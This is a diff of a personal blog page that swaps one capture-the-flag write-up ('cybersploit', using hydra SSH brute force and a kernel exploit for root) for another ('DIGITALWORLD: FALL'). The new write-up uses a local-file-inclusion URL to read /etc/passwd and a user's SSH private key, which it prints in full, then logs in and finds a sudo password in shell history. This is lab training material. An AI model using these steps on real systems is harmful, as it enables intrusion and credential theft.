@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF cybersploit | Peanutstick</title>
+  <title>DIGITALWORLD: FALL  | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF cybersploit | Peanutstick">
+  <meta name="description" content="DIGITALWORLD: FALL  | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="netdiscover192.168.0.24 rustscanrustscan -a 192.168.0.24 --ulimit 10000 The port 80, 443 and 9090 are interesting. Port 9090A login page.Fedora server Port 443 Simple CMS 2.2.15 There is an exploit on">
 <meta property="og:type" content="article">
@@ -914,9 +914,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF_cybersploit" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-DIGITALWORLD FALL" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF cybersploit</h1>
+        <h1 class="article-title">DIGITALWORLD: FALL </h1>
     
     <div class="article-meta">
         
@@ -941,12 +941,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-01-21 16:49:19'>2022-01-21 20:19</time>
+            Created At : <time class="date" title='Updated At: 2022-07-02 23:45:21'>2022-07-03 06:30</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:651</span>
+        <span>Count:783</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -965,7 +965,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-text">Description</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#port-80"><span class="toc-text">port 80</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt"><span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-code"><span class="toc-text">Source code</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gif"><span class="toc-text">Gif</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-22"><span class="toc-text">Port 22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2-txt"><span class="toc-text">flag2.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSE-sh"><span class="toc-text">LSE.sh</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finalflag-txt"><span class="toc-text">finalflag.txt</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-9090"><span class="toc-text">Port 9090</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-443"><span class="toc-text">Port 443</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Users"><span class="toc-text">Users</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infos"><span class="toc-text">Infos</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LFI"><span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#id-rsa-key"><span class="toc-text">id_rsa key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -981,100 +981,43 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.<br>FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER &amp; EXPLOIT-DB.</p>
-<h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><p><img src="https://i.imgur.com/eDewDgH.png"><br>192.168.0.42</p>
-<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>nmap -sV -p- 192.168.0.42</p>
-<p><img src="https://i.imgur.com/pbEEiON.png"></p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
-80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h1 id="port-80"><a href="#port-80" class="headerlink" title="port 80"></a>port 80</h1><p><img src="https://i.imgur.com/M9w3UTm.png"></p>
-<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 </p>
-<p>I think it’s base64.<br><img src="https://i.imgur.com/xTOyQCo.png"></p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">➜  ~ echo R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 --decode
-Good Work !
-Flag1: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125;%    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a>Source code</h2><p><img src="https://i.imgur.com/GLMB1Iq.png"></p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">&lt;!-------------username:itsskv---------------------&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h1><p>In the gif we have this code.<br>I don’t know what to do with it.<br>It’s not in hexadecimal because there is a P and S.</p>
-<pre class="line-numbers language-none"><code class="language-none">B2C B2B PSD RGB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Port-22"><a href="#Port-22" class="headerlink" title="Port 22"></a>Port 22</h1><p>I did a wordlist with the words in the gif and the website.<br><a href="https://weakpass.com/generate">https://weakpass.com/generate</a><br>Seriously:<br><img src="https://i.imgur.com/FTJV1k5.png"><br>And th password was the flag.</p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">hydra -l itsskv -P cyberwordlist -s 22 -f 192.168.0.42 ssh
-[22][ssh] host: 192.168.0.42   login: itsskv   password: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="flag2-txt"><a href="#flag2-txt" class="headerlink" title="flag2.txt"></a>flag2.txt</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">itsskv@cybersploit-CTF:~$ ls
-Desktop    Downloads         flag2.txt  Pictures  Templates
-Documents  examples.desktop  Music      Public    Videos
-itsskv@cybersploit-CTF:~$ cat flag2.txt 
-01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/Jturky3.png"></p>
-<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">good work !
-flag2: cybersploit&#123;https:t.me&#x2F;cybersploit1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="LSE-sh"><a href="#LSE-sh" class="headerlink" title="LSE.sh"></a>LSE.sh</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">    Hostname: cybersploit-CTF
-       Linux: 3.13.0-32-generic
-Distribution: Ubuntu 12.04.5 LTS
-Architecture: i686
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-[!] fst020 Uncommon setuid binaries........................................ yes!
----
-&#x2F;usr&#x2F;bin&#x2F;X
-&#x2F;usr&#x2F;bin&#x2F;lppasswd
----
-[*] fst080 Can we read subdirectories under &#x2F;home?......................... yes!
-[*] fst100 Useful binaries................................................. yes!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>I have one thing interestion, the ubuntu version.</p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p><a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a><br>I can’t download andd vi crash when I use it, that’s why I use nano.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itsskv@cybersploit-CTF:~$ <span class="token function">touch</span> exp.c
-itsskv@cybersploit-CTF:~$ 
-itsskv@cybersploit-CTF:~$ <span class="token function">nano</span> exp.c 
-itsskv@cybersploit-CTF:~$ gcc exp.c -o exp
-itsskv@cybersploit-CTF:~$ ./exp
-spawning threads
-<span class="token function">mount</span> <span class="token comment">#1</span>
-<span class="token function">mount</span> <span class="token comment">#2</span>
-child threads <span class="token keyword">done</span>
-/etc/ld.so.preload created
-creating shared library
-<span class="token comment"># id</span>
-<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>itsskv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h1 id="finalflag-txt"><a href="#finalflag-txt" class="headerlink" title="finalflag.txt"></a>finalflag.txt</h1><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">root@cybersploit-CTF:&#x2F;home&#x2F;itsskv# cat &#x2F;root&#x2F;finalflag.txt
-  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
- &#x2F;      |\   \  &#x2F;   &#x2F; |   _  \  |   ____||   _  \        &#x2F;       ||   _  \  |  |      &#x2F;  __  \  |  | |           |
-|  ,----&#39; \   \&#x2F;   &#x2F;  |  |_)  | |  |__   |  |_)  |      |   (----&#96;|  |_)  | |  |     |  |  |  | |  | &#96;---|  |----&#96;
-|  |       \_    _&#x2F;   |   _  &lt;  |   __|  |      &#x2F;        \   \    |   ___&#x2F;  |  |     |  |  |  | |  |     |  |     
-|  &#96;----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  &#96;----.|  &#96;--&#39;  | |  |     |  |     
- \______|    |__|     |______&#x2F;  |_______|| _| &#96;._____|_______&#x2F;    | _|      |_______| \______&#x2F;  |__|     |__|     
-                                                                                                                  
-
-   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
-  &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ &#x2F; \ 
- ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
-  \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; \_&#x2F; 
-
-flag3: cybersploit&#123;Z3X21CW42C4 many many congratulations !&#125;
-
-if you like it share with me https:&#x2F;&#x2F;twitter.com&#x2F;cybersploit1.
-
-Thanks !<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        <h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><p><img src="https://i.imgur.com/LFQf1ii.png"><br>192.168.0.24</p>
+<h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rustscan -a <span class="token number">192.168</span>.0.24 --ulimit <span class="token number">10000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/oUm4D6N.png"><br>The port 80, 443 and 9090 are interesting.</p>
+<h1 id="Port-9090"><a href="#Port-9090" class="headerlink" title="Port 9090"></a>Port 9090</h1><p><img src="https://i.imgur.com/VQiMdlV.png"><br>A login page.<br>Fedora server</p>
+<h1 id="Port-443"><a href="#Port-443" class="headerlink" title="Port 443"></a>Port 443</h1><p><img src="https://i.imgur.com/fGIscW3.png"></p>
+<p>Simple CMS 2.2.15<br><img src="https://i.imgur.com/VlZ4jnm.png"></p>
+<p>There is an exploit on this version:<br><a href="https://www.exploit-db.com/exploits/49345">https://www.exploit-db.com/exploits/49345</a></p>
+<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.27 -w Documents/wordlist/directory-list-2.3-medium.txt -x php --wildcard switch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/A5dcScn.png"></p>
+<ul>
+<li>Admin login page<br><a href="http://192.168.0.27/admin/login.php">http://192.168.0.27/admin/login.php</a></li>
+</ul>
+<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><ul>
+<li>qiu</li>
+</ul>
+<h2 id="Infos"><a href="#Infos" class="headerlink" title="Infos"></a>Infos</h2><p>They have a problem about a backdoor.<br><img src="https://i.imgur.com/nrMANAx.png"></p>
+<p><img src="https://i.imgur.com/2Sgz1vd.png"></p>
+<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p><a href="http://192.168.0.27/test.php">http://192.168.0.27/test.php</a><br><img src="https://i.imgur.com/QJv8XL5.png"><br><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</a></p>
+<p><a href="http://192.168.0.27/test.php?file=/etc/passwd">http://192.168.0.27/test.php?file=/etc/passwd</a></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-coredump:x:999:996:systemd Core Dumper:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;sbin&#x2F;nologin dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin polkitd:x:998:995:User for polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin cockpit-ws:x:997:993:User for cockpit-ws:&#x2F;:&#x2F;sbin&#x2F;nologin rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin chrony:x:996:991::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin qiu:x:1000:1000:qiu:&#x2F;home&#x2F;qiu:&#x2F;bin&#x2F;bash apache:x:48:48:Apache:&#x2F;usr&#x2F;share&#x2F;httpd:&#x2F;sbin&#x2F;nologin nginx:x:995:990:Nginx web server:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin clevis:x:994:989:Clevis Decryption Framework unprivileged user:&#x2F;var&#x2F;cache&#x2F;clevis:&#x2F;sbin&#x2F;nologin mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>The user qiu also exist on the system</p>
+<p>I can access to his home directory<br><a href="http://192.168.0.27/test.php?file=/home/qiu/.bashrc">http://192.168.0.27/test.php?file=/home/qiu/.bashrc</a></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text"># .bashrc # Source global definitions if [ -f &#x2F;etc&#x2F;bashrc ]; then . &#x2F;etc&#x2F;bashrc fi # Uncomment the following line if you don&#39;t like systemctl&#39;s auto-paging feature: # export SYSTEMD_PAGER&#x3D; # User specific aliases and functions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="id-rsa-key"><a href="#id-rsa-key" class="headerlink" title="id_rsa key"></a>id_rsa key</h1><p><a href="http://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa">http://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa</a></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0 FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX 61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj&#x2F;+uQlokUMtdc4NOv4XGJbp7GdEWBZevien qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw&#x2F;AfZ9ib21JGlOyy8cflTlogrZPoICCXIV&#x2F;kxGK0d Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO NY16EA&#x2F;NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP&#x2F;65CW iRQy11zg06&#x2F;hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom&#x2F;uel5BLUhdT1Wc&#x2F;ctaU4YVTSP4hLl KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G NWQcGzA4jgph96uLkNM&#x2F;X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6&#x2F;BY9RuaGG5B2DikbB 8t&#x2F;CDO79q7ccfTZs+gOVRX4PW641+cZxo5&#x2F;gL3GcdJwDY4ggPwbU&#x2F;m8sYsyN1NWJ8NH00d X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C&#x2F;8rseZsSJSxoXKk CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC&#x2F;TTqOIH+FXA66cFx3X4uOCjkzT0&#x2F;Es0uNyZ07qQ 58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0 acm4&#x2F;icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329 JW3Db+KISMRIvdpJv+eiKQLg&#x2F;epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT&#x2F;+ Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g&#x2F;uztWJuLpFe3Ue&#x2F;MLgeJ+2TiAw9yYoPVySNK8 uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC -----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token string">'http://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa'</span> -o id_rsa
+<span class="token function">chmod</span> <span class="token number">600</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> qiu@192.168.0.27 -i id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="https://i.imgur.com/JX7bBQ9.png"><br>I’m in :D</p>
+<p><img src="https://i.imgur.com/dfOyjCv.png"><br>It’s too late now.<br>Let’s see what is in the history.<br><img src="https://i.imgur.com/PT7Z1JK.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"remarkablyawesomE"</span> <span class="token operator">|</span> <span class="token function">sudo</span> -S dnf update
+<span class="token function">sudo</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p><img src="https://i.imgur.com/KeSq9U8.png"><br>I’m root.<br><img src="https://i.imgur.com/8LFPRmJ.png"></p>
 
       
        
